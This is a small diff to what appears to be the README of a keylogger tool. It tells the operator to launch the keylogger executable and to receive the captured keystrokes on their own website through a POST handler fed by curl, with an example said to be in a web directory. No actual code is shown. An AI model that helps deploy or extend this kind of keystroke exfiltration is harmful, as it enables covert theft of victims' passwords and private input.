@@ -20,4 +20,5 @@
 * Launch <NameKeylogger.exe>
 
 
-### $_POST['text'] matching request curl for receive data on your website
+### $_POST['text'] matching request curl for receive data on your website.
+### You have an example in web directory
